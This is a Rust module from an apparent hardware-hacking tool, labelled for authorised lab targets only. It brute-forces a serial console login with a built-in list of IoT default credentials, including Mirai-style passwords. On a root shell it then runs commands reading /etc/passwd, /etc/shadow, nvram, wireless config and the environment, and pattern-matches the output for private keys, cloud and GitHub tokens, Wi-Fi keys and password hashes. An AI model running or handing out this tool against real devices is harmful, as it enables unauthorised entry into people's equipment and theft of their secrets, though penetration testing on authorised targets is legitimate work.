//! Console default-credential testing and post-access secret harvesting.
//! Authorized lab targets only.

use std::error::Error;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use colored::*;

use crate::session::Session;

/// Well-known embedded/IoT default console credentials (user, pass).
pub fn default_creds() -> Vec<(&'static str, &'static str)> {
    vec![
        ("root", ""),
        ("root", "root"),
        ("admin", "admin"),
        ("admin", ""),
        ("root", "admin"),
        ("admin", "password"),
        ("root", "password"),
        ("root", "toor"),
        ("user", "user"),
        ("admin", "1234"),
        ("root", "1234"),
        ("root", "12345"),
        ("root", "calvin"),
        ("ubnt", "ubnt"),
        ("root", "vizxv"),
        ("root", "xc3511"),
        ("root", "Zte521"),
        ("admin", "admin1234"),
        ("supervisor", "supervisor"),
        ("guest", "guest"),
    ]
}

/// Try each credential pair against a console `login:` prompt. Returns the
/// first pair that lands a shell prompt. Heuristic: success is a shell prompt
/// (`#`/`$`) in the response and no fresh `login:`/`incorrect`.
pub fn cred_brute(
    port: &str,
    baud: u32,
    creds: &[(&str, &str)],
    running: Arc<AtomicBool>,
) -> Result<Option<(String, String)>, Box<dyn Error>> {
    println!("\n{}", "=== CONSOLE CREDENTIAL TEST ===".bold().magenta());
    let mut s = Session::open(port, baud, running.clone())?;
    s.echo = true;
    let login_pats = vec!["login:".to_string(), "username:".to_string()];
    let pass_pats = vec!["password:".to_string(), "password".to_string()];

    for (u, p) in creds {
        if !running.load(Ordering::SeqCst) {
            break;
        }
        s.send_line("")?;
        if s.expect(&login_pats, Duration::from_secs(4)).is_none() {
            // try once more after a nudge; the device may be mid-boot
            s.send_line("")?;
            s.expect(&login_pats, Duration::from_secs(4));
        }
        s.send_line(u)?;
        s.expect(&pass_pats, Duration::from_secs(3));
        s.send_line(p)?;
        let out = s.collect(Duration::from_secs(3)).to_ascii_lowercase();
        let got_shell = ["# ", "$ ", "/ #", "~ #", "root@", "busybox"]
            .iter()
            .any(|m| out.contains(m));
        let rejected = out.contains("incorrect")
            || out.contains("login incorrect")
            || out.contains("failed")
            || out.contains("login:");
        if got_shell && !rejected {
            println!(
                "{} valid credentials: {}:{}",
                "[+]".bold().green(),
                u,
                if p.is_empty() { "<empty>" } else { p }
            );
            return Ok(Some((u.to_string(), p.to_string())));
        }
        println!("{} {}:{} rejected", "[-]".dimmed(), u, if p.is_empty() { "<empty>" } else { p });
    }
    println!("{}", "no default credentials worked".yellow());
    Ok(None)
}

/// A sensitive value spotted in console output.
#[derive(Debug, PartialEq, Eq)]
pub struct Secret {
    pub category: &'static str,
    pub evidence: String,
}

/// Scan text (env dumps, config files, boot logs) for likely secrets.
pub fn extract_secrets(text: &str) -> Vec<Secret> {
    let mut out = Vec::new();
    for raw in text.lines() {
        let line = raw.trim();
        if line.is_empty() {
            continue;
        }
        let low = line.to_ascii_lowercase();
        let category: Option<&'static str> = if line.contains("PRIVATE KEY") {
            Some("private-key")
        } else if line.contains("BEGIN CERTIFICATE") {
            Some("certificate")
        } else if line.contains("eyJ") && line.matches('.').count() >= 2 {
            Some("jwt")
        } else if line.contains("AKIA") {
            Some("aws-access-key")
        } else if line.contains("AIza") {
            Some("google-api-key")
        } else if line.contains("ghp_") || line.contains("github_pat_") {
            Some("github-token")
        } else if low.contains("xoxb-") || low.contains("xoxp-") {
            Some("slack-token")
        } else if low.contains("psk=")
            || low.contains("wpa_passphrase")
            || low.contains("wifi_key")
            || (low.contains("wlan") && low.contains("key"))
        {
            Some("wifi-key")
        } else if line.contains("$1$")
            || line.contains("$5$")
            || line.contains("$6$")
            || line.contains("$y$")
        {
            Some("password-hash")
        } else if low.contains("ethaddr=") {
            Some("mac-address")
        } else if (low.contains("password")
            || low.contains("passwd")
            || low.contains("secret")
            || low.contains("api_key")
            || low.contains("apikey")
            || low.contains("token"))
            && line.contains('=')
        {
            Some("credential")
        } else if low.starts_with("serial") && line.contains('=') {
            Some("serial-number")
        } else {
            None
        };
        if let Some(c) = category {
            out.push(Secret {
                category: c,
                evidence: line.chars().take(200).collect(),
            });
        }
    }
    out
}

/// Run a fixed recon command set at an open root shell, scan the output for
/// secrets, and optionally save the full transcript.
pub fn harvest(
    port: &str,
    baud: u32,
    out_path: Option<&str>,
    running: Arc<AtomicBool>,
) -> Result<(), Box<dyn Error>> {
    println!("\n{}", "=== SECRET HARVEST ===".bold().magenta());
    let mut s = Session::open(port, baud, running)?;
    s.echo = true;
    s.send_line("")?;
    s.collect(Duration::from_millis(400));

    let cmds = [
        "id",
        "cat /proc/version",
        "cat /etc/passwd",
        "cat /etc/shadow 2>/dev/null",
        "nvram show 2>/dev/null | head -40",
        "cat /etc/config/wireless 2>/dev/null",
        "printenv 2>/dev/null",
        "cat /proc/cpuinfo 2>/dev/null | head -20",
    ];
    s.start_capture();
    for c in cmds {
        s.send_line(c)?;
        s.collect(Duration::from_secs(2));
    }
    let text = String::from_utf8_lossy(&s.log).into_owned();
    let secrets = extract_secrets(&text);

    println!("\n{} {} potential secret(s):", "[+]".bold().green(), secrets.len());
    for sec in &secrets {
        println!("  {:<16} {}", sec.category.cyan(), sec.evidence);
    }
    if let Some(path) = out_path {
        std::fs::write(path, &text)?;
        println!("{} full transcript saved to {}", "[*]".cyan(), path);
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn secrets_detection() {
        let t = "wifi_key=SuperSecret123\n\
                 normal line\n\
                 ethaddr=00:11:22:33:44:55\n\
                 foo password=hunter2\n\
                 root:$6$abcd$xyz:18000:0:99999:7:::\n\
                 -----BEGIN RSA PRIVATE KEY-----";
        let s = extract_secrets(t);
        let cats: Vec<_> = s.iter().map(|x| x.category).collect();
        assert!(cats.contains(&"wifi-key"));
        assert!(cats.contains(&"mac-address"));
        assert!(cats.contains(&"credential"));
        assert!(cats.contains(&"password-hash"));
        assert!(cats.contains(&"private-key"));
    }

    #[test]
    fn no_false_positive_on_plain_text() {
        let s = extract_secrets("the quick brown fox\njumps over\n");
        assert!(s.is_empty());
    }

    #[test]
    fn default_creds_nonempty() {
        assert!(default_creds().len() >= 10);
    }
}
